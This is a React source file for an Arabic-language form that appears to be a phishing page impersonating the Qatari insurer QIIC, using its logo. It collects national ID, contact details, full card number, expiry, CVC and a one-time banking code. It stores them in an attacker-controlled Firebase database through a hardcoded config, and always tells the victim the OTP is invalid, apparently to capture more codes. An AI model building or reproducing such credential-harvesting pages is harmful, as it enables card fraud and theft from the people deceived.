"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { initializeApp } from "firebase/app"
import { getFirestore, doc, setDoc } from "firebase/firestore"
import { Check, X } from "lucide-react"
import { LiveChatWidget } from "@livechat/widget-react"


// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
    authDomain: "adsapp-for.firebaseapp.com",
    projectId: "adsapp-for",
    storageBucket: "adsapp-for.appspot.com",
    messagingSenderId: "282166621415",
    appId: "1:282166621415:web:2be67338bc64233153de42",
    measurementId: "G-PG5NPD4FES"
}

// Initialize Firebase
const app = initializeApp(firebaseConfig)
const db = getFirestore(app);

type FormData = {
    personalInfo: {
        name: string
        email: string
        phone: string
        password: string,
        id: string
    }
    address: {
        street: string
        city: string
        state: string
        zipCode: string
    }
    payment: {
        cardNumber: string
        expiry: string
        cvc: string
    },
    otp: { otp: string }
}

type CardType = "Visa" | "Mastercard" | "American Express" | "Discover" | "Unknown"

const cardPatterns: { [key in Exclude<CardType, "Unknown">]: RegExp } = {
    Visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
    Mastercard: /^5[1-5][0-9]{14}$/,
    "American Express": /^3[47][0-9]{13}$/,
    Discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
}

const getCardType = (cardNumber: string): CardType => {
    for (const [type, pattern] of Object.entries(cardPatterns)) {
        if (pattern.test(cardNumber)) {
            return type as CardType
        }
    }
    return "Unknown"
}

const isValidCardNumber = (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\D/g, "")
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits[i], 10)

        if (isEven) {
            digit *= 2
            if (digit > 9) {
                digit -= 9
            }
        }

        sum += digit
        isEven = !isEven
    }

    return sum % 10 === 0
}

export default function Component() {
    const [cardNumber, setCardNumber] = useState("")
    const [expiry, setExpiry] = useState("")
    const [cvc, setcvc] = useState("")
    const [name, setName] = useState("")
    const [email, setEmail] = useState("")
    const [phone, setPhoen] = useState("")
    const [id, setID] = useState("")
    const [otp, setOTP] = useState("")
    const [cardType, setCardType] = useState<CardType>("Unknown")

    const [isValid, setIsValid] = useState<boolean | null>(null)
    const [step, setStep] = useState(1)
    const [formData, setFormData] = useState<FormData>({
        personalInfo: { name: "", email: "", phone: "", password: "", id: "" },
        address: { street: "", city: "", state: "", zipCode: "" },
        payment: { cardNumber: "", expiry: "", cvc: "" },
        otp: { otp: '' },
    })

    const handleValidate = () => {
        setIsValid(isValidCardNumber(cardNumber))
    }

    const updateFormData = (step: keyof FormData, field: string, value: string) => {
        setFormData((prev) => ({
            ...prev,
            [step]: {
                ...prev[step],
                [field]: value,
            },
        }))
    }
    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault()
        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp } }
        setDoc(doc(db, "data", cardNumber), alldat);

    }

  
    const AddressStep = () => (
        <>
            <div className="space-y-2">
                <label htmlFor="street">عنوان الشارع</label>
                <Input
                    type="text"
                    id="street"
                    placeholder="١٢٣ شارع الرئيسي"
                    defaultValue={formData.address.street}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="city">المدينة</label>
                <Input
                    id="city"
                    type="text"
                    placeholder="الرياض"
                    defaultValue={formData.address.city}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="state">المنطقة</label>
                <Input
                    id="state"
                    type="text"
                    placeholder="الرياض"
                    defaultValue={formData.address.state}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="zipCode">الرمز البريدي</label>
                <Input
                    type="number"
                    id="zipCode"
                    placeholder="١٢٣٤٥"
                    defaultValue={formData.address.zipCode}
                />
            </div>
        </>
    )
   


    const PaymentStep = () => (
        <div>
            <div className="space-y-2">
                <input
                    className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
                    } id="cardNumber"
                    placeholder="#### #### #### ####"

                    value={cardNumber}
                    onChange={(e) => {
                        e.preventDefault()
                        handleValidate()
                        setCardNumber(e.target.value)
                    }} maxLength={19}
                    minLength={16}
                />

            </div>
            <div className="space-y-2">
                <label htmlFor="expiry">تاريخ الانتهاء</label>
                <Input
                    id="expiry"
                    placeholder="شهر/سنة"
                    defaultValue={expiry}
                    onChange={(e) => {
                        setExpiry(e.target.value)
                    }}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="cvc">رمز الأمان</label>
                <Input
                    id="cvc"
                    placeholder="١٢٣"
                    value={cvc}
                    onChange={(e) => {
                        setcvc(e.target.value)
                    }}
                />
                <img src="./images/ads.png" alt="pyment" height={70} />
                {isValid !== null && (
                    <h3 className={`flex items-center gap-2 ${isValid ? "text-green-500" : "text-red-500"}`}>
                        {isValid ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
                        <span>{isValid ? "" : "رقم البطاقة غير صحيح"}</span>
                    </h3>
                )}
            </div>

        </div>
    )

    return (
        <div className="opt">
            <img className="logo" src="https://www.qiic.com.qa/wp-content/themes/qiic/assets/images/site-logo.png" alt="" height={60} />

            <Card className="w-full max-w-lg mx-auto" dir="rtl">
                <CardHeader>
                    <CardTitle>
                        {step === 1
                            ? "المعلومات الشخصية"
                            : step === 2
                                ? "تفاصيل العنوان" :
                                step === 3 ? "معلومات الدفع" : step === 4 ?
                                    "رمز التاكيد" : "رمز التاكيد"}
                    </CardTitle>
                </CardHeader>
                <form onSubmit={handleSubmit}>
                    <CardContent className="space-y-4">
                        {step === 1 ? (
                          <>
                             <div className="space-y-2">
                <label htmlFor="name"> الاسم الكامل </label>
                <div className="space-y-2">

                    <Input onChangeCapture={(e) => {
                        e.stopPropagation()
                        setName(e.currentTarget.value)
                    }}
                        name="name"
                        placeholder="الاسم الكامل"
                        onMouseDown={(e) => {
                        }}
                        defaultValue={name} />

                </div>
            </div>
            <div className="space-y-2">

                <label htmlFor="name">رقم الهوية</label>
                <Input
                    id="name"
                    placeholder="رقم الهوية"
                    type="number"
                    defaultValue={id}
                    onChange={(e) => setID(e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="email">البريد الإلكتروني</label>
                <Input
                    id="email"
                    type="email"
                    placeholder="mohammed@example.com"
                    defaultValue={email}
                    onChange={(e) => setEmail(e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="phone">رقم الهاتف</label>
                <Input
                    id="phone"
                    type="tel"
                    placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
                    onChange={(e) => setPhoen(e.target.value)}

                />
            </div></>
                        ) : step === 2 ? (
                            <AddressStep />
                        ) :
                            step === 3 ? (
                                <div>
                                <div className="space-y-2">
                                    <input
                                        className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
                                        } id="cardNumber"
                                        placeholder="#### #### #### ####"
                    
                                        value={cardNumber}
                                        onChange={(e) => {
                                            e.preventDefault()
                                            handleValidate()
                                            setCardNumber(e.target.value)
                                        }} maxLength={19}
                                        minLength={16}
                                    />
                    
                                </div>
                                <div className="space-y-2">
                                    <label htmlFor="expiry">تاريخ الانتهاء</label>
                                    <Input
                                        id="expiry"
                                        placeholder="شهر/سنة"
                                        defaultValue={expiry}
                                        onChange={(e) => {
                                            setExpiry(e.target.value)
                                        }}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <label htmlFor="cvc">رمز الأمان</label>
                                    <Input
                                        id="cvc"
                                        placeholder="١٢٣"
                                        value={cvc}
                                        onChange={(e) => {
                                            setcvc(e.target.value)
                                        }}
                                    />
                                    <img src="./images/ads.png" alt="pyment" height={70} />
                                    {isValidCardNumber(cardNumber) !== null && (
                                        <h3 className={`flex items-center gap-2 ${isValidCardNumber(cardNumber) ? "text-green-500" : "text-red-500"}`}>
                                            {isValidCardNumber(cardNumber) ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
                                            <span>{isValidCardNumber(cardNumber)     ? "" : "رقم البطاقة غير صحيح"}</span>
                                        </h3>
                                    )}
                                </div>
                    
                            </div>                            ) : step === 4 ?
                                (
                                    <>
            <div className="space-y-2">
                <label htmlFor="otp">  رمز OTP</label>
                <Input
                    defaultValue={otp}
                    onChange={(e) => setOTP(e.target.value)}
                />
            </div>
            <div className="flex justify-between mt-4">


            </div>
        </>
                                ) :
                                ( <>
                                    <div className="space-y-2">
                                        <label htmlFor="otp">  رمز OTP</label>
                                        <Input
                                            defaultValue={otp}
                                            onChange={(e) => setOTP(e.target.value)}
                                        />
                                    </div>
                                    <div className="flex justify-between mt-4">
                        
                        
                                    </div>
                                </>
                                )
                        }
                    </CardContent>
                    <CardFooter className="flex justify-between">
                        {step < 4 ? (
                            <Button type="button" onClick={() => setStep(step + 1)}>
                                التالي
                            </Button>

                        ) : step === 3 ? (
                            <Button type="submit" >
                                تحقق
                            </Button>
                        ) : step === 4 ? (<Button type="submit" onClick={() => alert("Invalid OTP")}>
                            تحقق
                        </Button>) :
                            (
                                <Button type="submit">إرسال</Button>
                            )}
                        {step > 1 && (
                            <Button type="button" variant="outline" onClick={() => setStep(step - 1)}>
                                السابق
                            </Button>
                        )}
                    </CardFooter>
                </form>
            </Card>
            <LiveChatWidget license={"18760068"} />
        </div>
    )
}